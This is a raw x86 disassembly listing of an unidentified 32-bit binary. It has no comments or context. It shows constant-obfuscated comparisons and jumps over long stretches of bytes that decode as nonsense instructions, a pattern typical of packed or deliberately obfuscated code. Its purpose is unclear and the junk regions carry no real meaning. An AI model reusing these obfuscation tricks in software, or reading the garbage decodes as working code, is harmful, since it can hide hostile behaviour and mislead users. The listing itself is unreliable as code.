  40972d:	xor    DWORD PTR ds:0x428331,0x49ee
  409737:	or     eax,edx
  409739:	mov    DWORD PTR ds:0x428365,0x383a
  409743:	mov    edx,DWORD PTR [ebp-0x10]
  409746:	or     ecx,esi
  409748:	sub    DWORD PTR ds:0x428359,0x6778
  409752:	mov    esi,DWORD PTR [ebp-0xc]
  409755:	or     eax,edx
  409757:	movzx  edx,BYTE PTR ds:0x42854d
  40975e:	xor    edx,DWORD PTR ds:0x428465
  409764:	mov    DWORD PTR ds:0x42854d,edx
  40976a:	mov    edx,DWORD PTR [ebp-0x30]
  40976d:	or     ecx,esi
  40976f:	mov    esi,DWORD PTR [ebp-0x2c]
  409772:	or     eax,0xf34
  409777:	neg    DWORD PTR ds:0x428469
  40977d:	or     ecx,0x6c90
  409783:	mov    DWORD PTR ds:0x42845d,0x7584
  40978d:	cmp    edx,eax
  40978f:	mov    DWORD PTR ds:0x428441,0x7ecb
  409799:	jne    0x4097bb
  40979f:	mov    DWORD PTR ds:0x42840d,0x4655
  4097a9:	cmp    esi,ecx
  4097ab:	mov    DWORD PTR ds:0x42840d,0x7ff3
  4097b5:	je     0x40a10f
  4097bb:	xor    esi,esi
  4097bd:	or     esi,DWORD PTR ds:0x42855d
  4097c3:	adc    DWORD PTR ds:0x4284e5,esi
  4097c9:	mov    DWORD PTR [ebp-0x30],0x5ddc
  4097d0:	mov    DWORD PTR [ebp-0x2c],0x7433
  4097d7:	mov    eax,DWORD PTR [ebp-0x30]
  4097da:	mov    ecx,DWORD PTR [ebp-0x2c]
  4097dd:	xor    ecx,0xfffffd1f
  4097e3:	xor    eax,0xffff9fff
  4097e8:	and    ecx,0x6e0
  4097ee:	and    eax,0x6244
  4097f3:	mov    DWORD PTR [ebp-0x10],eax
  4097f6:	mov    DWORD PTR [ebp-0xc],ecx
  4097f9:	mov    DWORD PTR [ebp-0x20],0x4a50
  409800:	mov    DWORD PTR [ebp-0x1c],0x2079
  409807:	mov    DWORD PTR [ebp-0x28],0x792e
  40980e:	mov    DWORD PTR [ebp-0x24],0x10e8
  409815:	mov    DWORD PTR [ebp-0x30],0x22b3
  40981c:	mov    DWORD PTR [ebp-0x2c],0x2293
  409823:	mov    eax,DWORD PTR [ebp-0x30]
  409826:	mov    ecx,DWORD PTR [ebp-0x2c]
  409829:	mov    edx,DWORD PTR [ebp-0x28]
  40982c:	mov    esi,DWORD PTR [ebp-0x24]
  40982f:	add    eax,edx
  409831:	mov    edx,DWORD PTR [ebp-0x20]
  409834:	adc    ecx,esi
  409836:	mov    esi,DWORD PTR [ebp-0x1c]
  409839:	add    eax,0x3e60
  40983e:	adc    ecx,0xd49e
  409844:	xor    eax,0x14ce
  409849:	xor    ecx,0x354f
  40984f:	add    eax,edx
  409851:	mov    edx,DWORD PTR [ebp-0x10]
  409854:	adc    ecx,esi
  409856:	mov    esi,DWORD PTR [ebp-0xc]
  409859:	cmp    edx,eax
  40985b:	jne    0x409869
  409861:	cmp    esi,ecx
  409863:	je     0x40a10f
  409869:	mov    DWORD PTR [ebp-0x28],0x4db
  409870:	mov    DWORD PTR [ebp-0x24],0x233b
  409877:	mov    DWORD PTR [ebp-0x30],0x2c94
  40987e:	push   0x6b33
  409883:	mov    DWORD PTR [ebp-0x2c],0x647f
  40988a:	jmp    0x409b09
  40988f:	and    BYTE PTR [ebx-0x53bd1443],ah
  409895:	sub    al,0xab
  409897:	dec    edi
  409898:	test   al,0xc
  40989a:	xchg   edx,eax
  40989b:	mov    bh,0x2d
  40989d:	test   al,0xe3
  40989f:	xacquire xchg DWORD PTR [esi-0x413d8642],edi
  4098a6:	mov    esi,0x9262b96d
  4098ab:	into   
  4098ac:	cmp    al,0xeb
  4098ae:	sub    eax,0xa4730bae
  4098b3:	sahf   
  4098b4:	ins    DWORD PTR es:[edi],dx
  4098b5:	xor    al,al
  4098b7:	and    al,0x1a
  4098b9:	jecxz  0x4098b0
  4098bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098bc:	cs ret 0x4df6
  4098c0:	cmp    BYTE PTR [ebx-0x62],0xd4
  4098c4:	not    BYTE PTR [edx-0x7feeaf75]
  4098ca:	in     eax,0x8e
  4098cc:	fidivr WORD PTR ss:[esp+esi*4]
  4098d0:	call   0x59a0:0x20cce814
  4098d7:	std    
  4098d8:	push   ebx
  4098d9:	fidiv  DWORD PTR [ecx-0x65]
  4098dc:	mov    DWORD PTR [ecx],esi
  4098de:	add    eax,0x89f2dbcc
  4098e3:	dec    esi
  4098e4:	lds    edi,FWORD PTR [esi+0x58212087]
  4098ea:	imul   esi,DWORD PTR [ebx+0x2e],0xffffffd8
  4098ee:	dec    esi
  4098ef:	(bad)  
  4098f0:	(bad)  
  4098f2:	cdq    
  4098f3:	push   ebx
  4098f4:	cmp    eax,0x3cee1027
  4098f9:	jnp    0x409898
  4098fb:	sbb    al,0x47
  4098fd:	fcomp  st(6)
  4098ff:	cmc    
  409900:	jae    0x409890
  409902:	and    esp,DWORD PTR [edx+0x4f]
  409905:	push   0xa85f0b4d
  40990a:	gs in  eax,0x67
  40990d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40990e:	(bad)  [edx]
  409910:	mov    ebx,0x371e72e2
  409915:	and    BYTE PTR [ebp-0x5906dc4b],al
  40991b:	adc    BYTE PTR [edi+edx*8],ch
  40991e:	xor    al,0x26
  409920:	test   ecx,eax
  409922:	iret   
  409923:	pop    ds
  409924:	test   DWORD PTR [ecx+0x5e],ebx
  409927:	aaa    
  409928:	into   
  409929:	push   es
  40992a:	jo     0x4098d7
  40992c:	jecxz  0x4098e6
  40992e:	or     edi,DWORD PTR [ecx]
  409930:	enter  0xbe1d,0xea
  409934:	inc    eax
  409935:	adc    al,0x19
  409937:	lock pop ecx
  409939:	sbb    DWORD PTR [ebx],ebx
  40993b:	xor    al,0x6c
  40993d:	push   eax
  40993e:	ret    
  40993f:	xchg   ebp,eax
  409940:	out    0x70,eax
  409942:	ret    0x12b7
  409945:	cmp    al,0xec
  409947:	push   eax
  409948:	push   edi
  409949:	or     eax,0x93080cd0
  40994e:	xchg   esi,eax
  40994f:	jb     0x4098d4
  409951:	xchg   edx,eax
  409952:	xchg   esi,eax
  409953:	inc    ebx
  409954:	mov    ebp,DWORD PTR ds:0x980565c
  40995a:	sahf   
  40995b:	cwde   
  40995c:	enter  0xabe0,0x1e
  409960:	jl     0xf30aefe8
  409966:	sbb    DWORD PTR [eax+ecx*8-0x51],edi
  40996a:	sub    dh,bl
  40996c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40996d:	mov    edi,0x6ff75eef
  409972:	xchg   esi,eax
  409973:	mov    ecx,0x4070e3e
  409978:	test   BYTE PTR [ebx+0x1e],bl
  40997b:	imul   eax,ebp,0xc1a9aba
  409981:	ret    
  409982:	mov    edx,0x54530c65
  409987:	cmp    al,0x67
  409989:	fistp  WORD PTR [edi+0x79]
  40998c:	dec    DWORD PTR [esi-0x2f]
  40998f:	gs add eax,0x476d2146
  409995:	or     dl,BYTE PTR [ebx+0x47a8d7a]
  40999b:	xor    cl,BYTE PTR [ebx+0x33276f7c]
  4099a1:	shl    DWORD PTR [edi+0xd7d377],0xb3
  4099a8:	xchg   ebx,eax
  4099a9:	popf   
  4099aa:	das    
  4099ab:	retf   
  4099ac:	sbb    eax,0x3fc31615
  4099b1:	pop    esi
  4099b2:	mov    al,0xe8
  4099b4:	mov    ds:0x235c4574,al
  4099b9:	(bad)  
  4099ba:	out    0xd6,al
  4099bc:	sti    
  4099bd:	not    DWORD PTR [esi]
  4099bf:	xor    DWORD PTR [edi+0x28],ebx
  4099c2:	jecxz  0x4099d3
  4099c4:	in     al,0x39
  4099c6:	mov    eax,0x190e4135
  4099cb:	sub    BYTE PTR [ecx+0x3a3ba655],al
  4099d1:	inc    esp
  4099d2:	jl     0x409a12
  4099d4:	or     bl,BYTE PTR [ebx+0x16]
  4099d7:	and    ah,dh
  4099d9:	mov    cl,0xf7
  4099db:	xor    dl,BYTE PTR [esi+0x12d16937]
  4099e1:	jno    0x409a23
  4099e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099e4:	adc    DWORD PTR [eax+ecx*4+0x5f4a57f],ebp
  4099eb:	popf   
  4099ec:	mov    ebp,edi
  4099ee:	scas   eax,DWORD PTR es:[edi]
  4099ef:	out    0xf5,al
  4099f1:	call   0x9d49:0xbeb23ea0
  4099f8:	and    dl,al
  4099fa:	aam    0xe2
  4099fc:	mov    ebx,0x18516566
  409a01:	dec    ebp
  409a02:	push   edi
  409a03:	loope  0x4099b0
  409a05:	xor    DWORD PTR [edi-0x364cf195],ebx
  409a0b:	pop    eax
  409a0c:	inc    ebp
  409a0d:	sub    ah,BYTE PTR ds:0xd18f9dd1
  409a13:	mov    ebp,0x9db6f12f
  409a18:	ja     0x4099b3
  409a1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a1b:	mov    eax,ds:0xb651ffd9
  409a20:	mov    eax,ds:0xbb4371b0
  409a25:	or     eax,0x7047028d
  409a2a:	inc    ebp
  409a2b:	pusha  
  409a2c:	push   ebp
  409a2d:	xor    cl,BYTE PTR [edx-0x27]
  409a30:	jecxz  0x409a02
  409a32:	hlt    
  409a33:	add    al,0x6d
  409a35:	loop   0x409a59
  409a37:	add    ecx,DWORD PTR [esi]
  409a39:	fstp   QWORD PTR [ebp-0x6c]
  409a3c:	sub    esi,edi
  409a3e:	js     0x4099cb
  409a40:	pop    esp
  409a41:	inc    esi
  409a42:	mov    cl,0xa8
  409a44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a45:	leave  
  409a46:	sbb    BYTE PTR [edx],al
  409a48:	jmp    FWORD PTR [ebp+eiz*4+0x1bf64054]
  409a4f:	daa    
  409a50:	dec    edi
  409a51:	mov    esp,ebp
  409a53:	ins    BYTE PTR es:[edi],dx
  409a54:	pop    ds
  409a55:	add    al,cl
  409a57:	jns    0x409a72
  409a59:	ret    
  409a5a:	mov    ah,0x85
  409a5c:	jmp    0x409a95
  409a5e:	xor    al,BYTE PTR [ecx]
  409a60:	cmp    eax,0x11e98b80
  409a65:	fs mov BYTE PTR cs:[ecx+ebp*1+0x585cef1],dh
  409a6e:	mov    DWORD PTR cs:[edx-0xcc56e54],esi
  409a75:	push   eax
  409a76:	in     al,dx
  409a77:	daa    
  409a78:	(bad)  
  409a79:	jmp    0x3b31:0xef5ce06f
  409a80:	clc    
  409a81:	fdivr  QWORD PTR [ecx]
  409a83:	jne    0x409a6f
  409a85:	mov    BYTE PTR [ebx],cl
  409a87:	and    DWORD PTR [edx+eax*1-0x4e],0x7d50789c
  409a8f:	or     DWORD PTR [edx+0x25],esp
  409a92:	test   DWORD PTR [edx],ebp
  409a94:	cmp    ch,BYTE PTR ds:0xed139c7a
  409a9a:	xchg   ebp,eax
  409a9b:	lds    esp,FWORD PTR [edi]
  409a9d:	pop    ecx
  409a9e:	sti    
  409a9f:	pushf  
  409aa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409aa1:	jmp    0x6611608d
  409aa6:	mov    eax,0x59275079
  409aab:	cmp    al,0x10
  409aad:	sub    DWORD PTR [ecx],esi
  409aaf:	dec    eax
  409ab0:	mov    edx,0x21eb18c9
  409ab5:	icebp  
  409ab6:	adc    eax,0xc2fd3759
  409abb:	jp     0x409a4e
  409abd:	and    DWORD PTR [edi],ecx
  409abf:	ret    
  409ac0:	(bad)  
  409ac2:	mov    ch,0x38
  409ac4:	sub    bh,al
  409ac6:	xor    ch,BYTE PTR [ebp+0x75]
  409ac9:	iret   
  409aca:	retf   0x3ea7
  409acd:	out    0xf,eax
  409acf:	xchg   esi,eax
  409ad0:	and    al,0xf0
  409ad2:	mov    ah,0x2b
  409ad4:	mov    ebx,0x158246a7
  409ad9:	(bad)  
  409ada:	dec    edx
  409adb:	add    BYTE PTR [edx-0x72],dl
  409ade:	dec    ebp
  409adf:	mov    dl,0xa4
  409ae1:	rcr    DWORD PTR [edi],cl
  409ae3:	or     cl,bh
  409ae5:	pop    ebx
  409ae6:	dec    esi
  409ae7:	adc    al,0x2d
  409ae9:	pop    ebx
  409aea:	sahf   
  409aeb:	leave  
  409aec:	add    edx,DWORD PTR [eax]
  409aee:	in     al,dx
  409aef:	into   
  409af0:	jmp    0x7121:0x7f2ed902
  409af7:	adc    DWORD PTR [ebp+0x507c7b5b],ecx
  409afd:	add    DWORD PTR [edi-0x5d6a0f31],eax
  409b03:	add    eax,0xe6012d51
  409b08:	push   ds
  409b09:	mov    eax,DWORD PTR [ebp-0x30]
  409b0c:	mov    ecx,DWORD PTR [ebp-0x2c]
  409b0f:	push   0x7c8f
  409b14:	push   ecx
  409b15:	push   eax
  409b16:	call   0x41594e
  409b1b:	mov    ecx,DWORD PTR [ebp-0x28]
  409b1e:	mov    esi,DWORD PTR [ebp-0x24]
  409b21:	push   0x4e1a18a
  409b26:	push   0x283cdcc
  409b2b:	and    edx,esi
  409b2d:	and    eax,ecx
  409b2f:	push   edx
  409b30:	push   eax
  409b31:	call   0x41594e
  409b36:	xor    eax,0x687b
  409b3b:	xor    edx,0x18d4
  409b41:	mov    DWORD PTR [ebp-0x30],eax
  409b44:	mov    DWORD PTR [ebp-0x2c],edx
  409b47:	mov    eax,ds:0x42291c
  409b4c:	cmp    eax,0x7cd80819
  409b51:	jne    0x40a10f
  409b57:	mov    eax,DWORD PTR [ebp-0x18]
  409b5a:	mov    ecx,DWORD PTR [ebp-0x14]
  409b5d:	mov    edx,DWORD PTR [ebp-0x18]
  409b60:	mov    esi,DWORD PTR [ebp-0x14]
  409b63:	shrd   eax,ecx,0x2
  409b67:	shl    edx,0x1e
  409b6a:	mov    edx,DWORD PTR ds:0x422708
  409b70:	mov    edx,DWORD PTR [edx+0x1a8]
  409b76:	shr    ecx,0x2
  409b79:	xor    esi,esi
  409b7b:	mov    ecx,0x32de6d5d
  409b80:	xor    eax,ecx
  409b82:	or     eax,esi
  409b84:	mov    DWORD PTR [edx],eax
  409b86:	mov    eax,DWORD PTR [ebp-0x18]
  409b89:	mov    edx,DWORD PTR [ebp-0x14]
  409b8c:	shrd   eax,edx,0x2
  409b90:	shr    edx,0x2
  409b93:	mov    edx,DWORD PTR [ebp-0x18]
  409b96:	mov    esi,DWORD PTR [ebp-0x14]
  409b99:	xor    eax,ecx
  409b9b:	xor    esi,esi
  409b9d:	or     eax,esi
  409b9f:	mov    ds:0x42291c,eax
  409ba4:	mov    BYTE PTR [ebp-0x2],0x4f
  409ba8:	mov    BYTE PTR [ebp-0x1],0xf9
  409bac:	movzx  eax,BYTE PTR [ebp-0x1]
  409bb0:	shl    edx,0x1e
  409bb3:	mov    dl,BYTE PTR [ebp-0x2]
  409bb6:	xor    al,0x42
  409bb8:	add    al,dl
  409bba:	jmp    0x409e39
  409bbf:	mov    ah,0x7e
  409bc1:	mov    ch,0xd4
  409bc3:	mov    ebx,0x3e9ebcfc
  409bc8:	mov    cl,0x9a
  409bca:	jecxz  0x409c0f
  409bcc:	jle    0x409b82
  409bce:	iret   
  409bcf:	scas   al,BYTE PTR es:[edi]
  409bd0:	mov    edi,DWORD PTR [esi-0x413d8642]
  409bd6:	mov    esi,0xc190f9fe
  409bdb:	push   ebx
  409bdc:	mov    ebp,0x40129278
  409be1:	add    cl,BYTE PTR [edx+0x2f]
  409be4:	xchg   esi,eax
  409be5:	lahf   
  409be6:	xor    ebx,ecx
  409be8:	(bad)  
  409be9:	(bad)  
  409bea:	mov    DWORD PTR [esi+0x60],esp
  409bed:	out    dx,eax
  409bee:	pop    ecx
  409bef:	test   esp,ebx
  409bf1:	xchg   edx,eax
  409bf2:	jns    0x409bb7
  409bf4:	scas   al,BYTE PTR es:[edi]
  409bf5:	and    ebp,DWORD PTR [eax]
  409bf7:	or     DWORD PTR [ebx+0x6ad74782],edx
  409bfd:	mov    ds:0x9b45046a,eax
  409c02:	retf   0xb38f
  409c05:	adc    bh,BYTE PTR [eax]
  409c07:	jmp    0x8d54:0xb48461b2
  409c0e:	sub    al,0x82
  409c10:	leave  
  409c11:	or     edx,esi
  409c13:	mov    ds:0xe419b63a,eax
  409c18:	mov    cl,0x3f
  409c1a:	pop    esp
  409c1b:	push   ecx
  409c1c:	outs   dx,DWORD PTR ds:[esi]
  409c1d:	adc    edx,DWORD PTR [esi-0x752c1f8]
  409c23:	mov    al,ds:0x5655cfff
  409c28:	repz jp 0x409bdf
  409c2b:	lock sahf 
  409c2d:	das    
  409c2e:	jl     0x409c63
  409c30:	cmp    dl,ch
  409c32:	adc    eax,DWORD PTR [ecx+0x25b5e583]
  409c38:	in     al,dx
  409c39:	mov    ch,0xe7
  409c3b:	icebp  
  409c3c:	adc    al,0xfc
  409c3e:	in     al,dx
  409c3f:	sbb    BYTE PTR [edx+esi*2],bl
  409c42:	push   ebx
  409c43:	test   al,0xa6
  409c45:	adc    al,0x7a
  409c47:	ins    BYTE PTR es:[edi],dx
  409c48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c4a:	pop    esp
  409c4b:	xchg   ecx,eax
  409c4c:	fs mov edi,0x4dad87de
  409c52:	or     DWORD PTR [ebx],edx
  409c54:	xchg   ebp,eax
  409c55:	adc    bh,0xdf
  409c58:	clc    
  409c59:	repz loop 0x409c63
  409c5c:	and    edi,esp
  409c5e:	dec    ebx
  409c5f:	popf   
  409c60:	repz jl 0x409c2f
  409c63:	(bad)  
  409c64:	lock repz gs cld 
  409c68:	push   eax
  409c69:	icebp  
  409c6a:	mov    dl,BYTE PTR [esi]
  409c6c:	ret    
  409c6d:	push   edx
  409c6e:	(bad)  
  409c6f:	lods   eax,DWORD PTR ds:[esi]
  409c70:	push   eax
  409c71:	xlat   BYTE PTR ds:[ebx]
  409c72:	rcl    DWORD PTR [esp+edi*8+0x6d515f2f],cl
  409c79:	sbb    dh,bh
  409c7b:	ins    DWORD PTR es:[edi],dx
  409c7c:	push   esp
  409c7d:	and    ah,al
  409c7f:	sar    DWORD PTR [ecx-0x32e52743],cl
  409c85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c87:	std    
  409c88:	aad    0x7f
  409c8a:	cmp    DWORD PTR [eax],edi
  409c8c:	repz out dx,al
  409c8e:	movzx  edi,WORD PTR [ebp+ebx*8-0x18]
  409c93:	or     eax,0xe824ed5d
  409c98:	int3   
  409c99:	pushf  
  409c9a:	push   esi
  409c9b:	ins    BYTE PTR es:[edi],dx
  409c9c:	arpl   WORD PTR [edi+0x1d],cx
  409c9f:	jg     0x409c84
  409ca1:	sbb    ecx,DWORD PTR [edi+ebp*1+0xd3458e4]
  409ca8:	adc    al,0xfe
  409caa:	loope  0x409d16
  409cac:	fsubr  QWORD PTR [ecx+eiz*8]
  409caf:	lahf   
  409cb0:	sbb    edx,DWORD PTR [eax-0x47]
  409cb3:	or     eax,0xda9eae7b
  409cb8:	and    eax,0x6fea84bd
  409cbd:	stos   BYTE PTR es:[edi],al
  409cbe:	ins    DWORD PTR es:[edi],dx
  409cbf:	mov    ah,0xdd
  409cc1:	dec    eax
  409cc2:	pop    ds
  409cc3:	nop
  409cc4:	cli    
  409cc5:	fs xchg BYTE PTR fs:[edi+0x1b],bh
  409cca:	repz or al,0x99
  409ccd:	dec    esp
  409cce:	sub    bl,BYTE PTR [eax]
  409cd0:	dec    eax
  409cd1:	popa   
  409cd2:	xchg   ebx,eax
  409cd3:	mov    ch,0x78
  409cd5:	mov    ecx,0xf69e3d92
  409cda:	neg    ebx
  409cdc:	jle    0x409cbe
  409cde:	ja     0x409d04
  409ce0:	dec    edi
  409ce1:	and    DWORD PTR [ecx-0x6f],edi
  409ce4:	inc    edi
  409ce5:	dec    eax
  409ce6:	ret    
  409ce7:	push   edi
  409ce8:	lods   al,BYTE PTR ds:[esi]
  409ce9:	dec    edi
  409cea:	cmp    al,0x9
  409cec:	xchg   esi,eax
  409ced:	cdq    
  409cee:	pop    esp
  409cef:	pop    esp
  409cf0:	adc    ecx,DWORD PTR [edx]
  409cf2:	mov    BYTE PTR [ecx+ecx*8+0x6152f307],bh
  409cf9:	push   0x70
  409cfb:	stc    
  409cfc:	sub    eax,0x668d336c
  409d01:	push   edx
  409d02:	imul   esp,DWORD PTR [esi-0x41],0x30384231
  409d09:	xor    DWORD PTR [eax],edi
  409d0b:	and    BYTE PTR ds:0x523a640c,bh
  409d11:	ror    BYTE PTR [ebp-0x29],1
  409d14:	rcr    ah,0x81
  409d17:	gs pop esp
  409d19:	das    
  409d1a:	loope  0x409d19
  409d1c:	shl    DWORD PTR [esi+0x61],1
  409d1f:	dec    ecx
  409d20:	imul   edx,esp,0x76113810
  409d26:	fild   DWORD PTR [edi-0x76aa332d]
  409d2c:	xor    eax,0x98b106dd
  409d31:	nop
  409d32:	dec    ebp
  409d33:	out    dx,al
  409d34:	mov    edi,0x48d029d3
  409d39:	out    dx,al
  409d3a:	(bad)  
  409d3b:	repnz out dx,eax
  409d3d:	stos   DWORD PTR es:[edi],eax
  409d3e:	jae    0x409d91
  409d40:	cmp    bh,dh
  409d42:	pop    ss
  409d43:	xor    al,0xac
  409d45:	cmp    ch,BYTE PTR [esi+0x53]
  409d48:	lds    esi,FWORD PTR [edx+0x66]
  409d4b:	jae    0x409d7a
  409d4d:	dec    edx
  409d4e:	rcl    BYTE PTR [edx-0x3d],0x8c
  409d52:	in     al,dx
  409d53:	jp     0x409d7b
  409d55:	fwait
  409d56:	jbe    0x409d27
  409d58:	aas    
  409d59:	je     0x409d57
  409d5b:	mov    esp,0xe3c2a2a3
  409d60:	mov    ebx,0xfb220e16
  409d65:	adc    eax,0x6eb7b9ef
  409d6a:	sbb    esp,DWORD PTR [edx]
  409d6c:	jno    0x409d17
  409d6e:	add    al,0x8d
  409d70:	sbb    eax,0x664e9a6e
  409d75:	mov    ah,0xf9
  409d77:	add    DWORD PTR [ebx],ebx
  409d79:	div    BYTE PTR [eax+0x6ab72904]
  409d7f:	ss dec esp
  409d82:	mov    ecx,0x876f7ea
  409d87:	or     al,0x3
  409d89:	pop    es
  409d8a:	repz rcl BYTE PTR [ebp+0x47],cl
  409d8e:	popa   
  409d8f:	retf   
  409d90:	xor    bh,BYTE PTR [ebx+0x39]
  409d93:	adc    ebp,ecx
  409d95:	mov    dl,0x73
  409d97:	call   0x5122:0xb466fc47
  409d9e:	sahf   
  409d9f:	adc    bl,0xee
  409da2:	int    0x64
  409da4:	mov    BYTE PTR [ebp-0x78],dh
  409da7:	or     al,0x8f
  409da9:	adc    ah,cl
  409dab:	mov    ebx,0xe48554a
  409db0:	mov    ebp,0xdf1eb7d3
  409db5:	rol    BYTE PTR [ecx],0xf6
  409db8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409db9:	jae    0x409dd3
  409dbb:	mov    bl,ch
  409dbd:	sbb    DWORD PTR [ebx+0x3a],ebx
  409dc0:	push   edx
  409dc1:	jne    0x409df0
  409dc3:	out    0xc4,eax
  409dc5:	pushf  
  409dc6:	adc    eax,0xcfca9bc4
  409dcb:	xor    edi,0x8ee435c7
  409dd1:	and    al,0xcf
  409dd3:	mov    al,0x9d
  409dd5:	jecxz  0x409db8
  409dd7:	pop    edi
  409dd8:	fistp  DWORD PTR [edx-0x55]
  409ddb:	mov    edi,edx
  409ddd:	in     al,dx
  409dde:	sbb    edi,edx
  409de0:	in     eax,dx
  409de1:	loope  0x409dc2
  409de3:	sbb    eax,DWORD PTR [ebx+0x9da5463]
  409de9:	pop    edi
  409dea:	(bad)  
  409deb:	js     0x409e2a
  409ded:	adc    bh,BYTE PTR [edi+eax*4]
  409df0:	jmp    0xccbaf47b
  409df5:	retf   0xa095
  409df8:	pop    ebx
  409df9:	xchg   ebx,eax
  409dfa:	fisttp QWORD PTR [ebp+0xb]
  409dfd:	pop    esp
  409dfe:	cmp    al,BYTE PTR [ebx+0x55]
  409e01:	lods   eax,DWORD PTR ds:[esi]
  409e02:	push   0xffffffeb
  409e04:	sub    ebx,0x2913d96d
  409e0a:	(bad)  
  409e0b:	ja     0x409d92
  409e0d:	jne    0x409e61
  409e0f:	jl     0x409e0c
  409e11:	fcom   DWORD PTR [esi]
  409e13:	mov    BYTE PTR [ecx+ebx*2+0x5bf94082],bl
  409e1a:	xchg   esi,eax
  409e1b:	sbb    bl,BYTE PTR [ebp-0x68]
  409e1e:	sbb    DWORD PTR [eax-0x1be97158],esp
  409e24:	cs addr16 popa 
  409e27:	stc    
  409e28:	jl     0x409e8a
  409e2a:	out    dx,eax
  409e2b:	stc    
  409e2c:	pop    ss
  409e2d:	pop    ebp
  409e2e:	aas    
  409e2f:	call   0x70f8:0x575513ae
  409e36:	xchg   ebx,eax
  409e37:	test   DWORD PTR [esi+0x6a],edx
  409e3a:	push   es
  409e3b:	add    eax,0xfa
  409e40:	mov    BYTE PTR [ebp-0x4],al
  409e43:	mov    BYTE PTR [ebp-0x3],0x67
  409e47:	pop    eax
  409e48:	mov    BYTE PTR [ebp-0x1],al
  409e4b:	mov    BYTE PTR [ebp-0x2],0x3
  409e4f:	mov    dl,BYTE PTR [ebp-0x2]
  409e52:	movzx  esi,dl
  409e55:	cdq    
  409e56:	idiv   esi
  409e58:	mov    dl,BYTE PTR [ebp-0x1]
  409e5b:	add    al,dl
  409e5d:	mov    dl,BYTE PTR [ebp-0x3]
  409e60:	or     al,dl
  409e62:	mov    dl,BYTE PTR [ebp-0x4]
  409e65:	add    al,0x3a
  409e67:	cmp    dl,al
  409e69:	jae    0x40a10f
  409e6f:	mov    eax,DWORD PTR [ebp-0x18]
  409e72:	jmp    0x40a0f1
  409e77:	popa   
  409e78:	nop
  409e79:	popf   
  409e7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e7b:	mov    ah,0xb8
  409e7d:	imul   ebx,DWORD PTR [eax+edi*1+0x2fa4862c],0xffffffaa
  409e85:	out    dx,al
  409e86:	iret   
  409e87:	imul   edx,DWORD PTR [ecx-0x3d864142],0x4b4dbebe
  409e91:	xchg   ebx,eax
  409e93:	fdiv   QWORD PTR [ecx+edi*8-0x1afc2174]
  409e9a:	jns    0x409ef0
  409e9c:	cmp    ebp,esi
  409e9e:	jne    0x409e31
  409ea0:	mov    al,ds:0x3f461c59
  409ea5:	(bad)  
  409ea7:	fcomp  QWORD PTR [edi+0x56]
  409eaa:	lea    ecx,[edi+0x18]
  409ead:	mov    BYTE PTR [ebx+esi*2+0x163ec0ec],dh
  409eb4:	outs   dx,DWORD PTR ds:[esi]
  409eb5:	fcomp  QWORD PTR [esi-0x5a24bd55]
  409ebb:	dec    esp
  409ebc:	cs jne 0x409f01
  409ebf:	repz cmp bl,bl
  409ec2:	aas    
  409ec3:	jmp    0x409ebb
  409ec5:	or     bh,BYTE PTR [edi+0x25]
  409ec8:	fsubr  st(7),st
  409eca:	js     0x409e57
  409ecc:	inc    ebp
  409ecd:	dec    edx
  409ece:	ret    0x97fe
  409ed1:	outs   dx,BYTE PTR ds:[esi]
  409ed2:	sbb    eax,DWORD PTR [ecx]
  409ed4:	gs repnz add eax,0x3166d4b6
  409edb:	mov    esi,0x811b65da
  409ee0:	pusha  
  409ee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ee2:	out    dx,eax
  409ee3:	sub    al,0x6b
  409ee5:	or     dh,0xb8
  409ee8:	or     ah,ah
  409eea:	loope  0x409ebd
  409eec:	sbb    esi,edi
  409eee:	mov    ds:0xd7bf3f6e,eax
  409ef3:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  409ef5:	xlat   BYTE PTR ds:[ebx]
  409ef6:	(bad)  
  409ef7:	jl     0x409e81
  409ef9:	(bad)  
  409efa:	or     eax,0x79adcaf6
  409eff:	xchg   esi,eax
  409f00:	add    BYTE PTR [esi],0xdb
  409f03:	inc    esi
  409f04:	sub    DWORD PTR [ebp-0x7adccfd0],ebp
  409f0a:	test   DWORD PTR [esi-0x53516a47],ecx
  409f10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f11:	xor    ebp,ebp
  409f13:	adc    DWORD PTR [ebp-0x4d],eax
  409f16:	pusha  
  409f17:	fs jge 0x409eee
  409f1a:	aam    0x16
  409f1c:	dec    ecx
  409f1d:	aas    
  409f1e:	mov    ch,BYTE PTR [edx+0x116df1cf]
  409f24:	sahf   
  409f25:	adc    BYTE PTR [ebp-0x2629a75b],0x1a
  409f2c:	sub    BYTE PTR [eax+ebp*1-0x948773a],dl
  409f33:	lods   al,BYTE PTR ds:[esi]
  409f34:	xchg   BYTE PTR [edx+0x4],al
  409f37:	call   0xa87774ad
  409f3c:	push   ebp
  409f3d:	fwait
  409f3e:	push   ebp
  409f3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f40:	cmp    al,0xce
  409f42:	sti    
  409f43:	jbe    0x409fa5
  409f45:	and    edi,ebp
  409f47:	mov    WORD PTR [ebx],fs
  409f49:	inc    ebp
  409f4a:	leave  
  409f4b:	push   ebp
  409f4c:	push   ss
  409f4d:	jnp    0x409f74
  409f4f:	imul   ebx,DWORD PTR [esp+ecx*4-0x1559b3aa],0x2
  409f57:	mov    bh,0x8a
  409f59:	mov    bl,0xfd
  409f5b:	out    dx,al
  409f5c:	or     DWORD PTR [esi+eax*1-0x1],esi
  409f60:	cdq    
  409f61:	mov    WORD PTR [eax-0x26acfc78],ss
  409f67:	sbb    eax,0x5e61ef03
  409f6c:	stos   BYTE PTR es:[edi],al
  409f6d:	xchg   edi,eax
  409f6e:	inc    edi
  409f6f:	pop    ecx
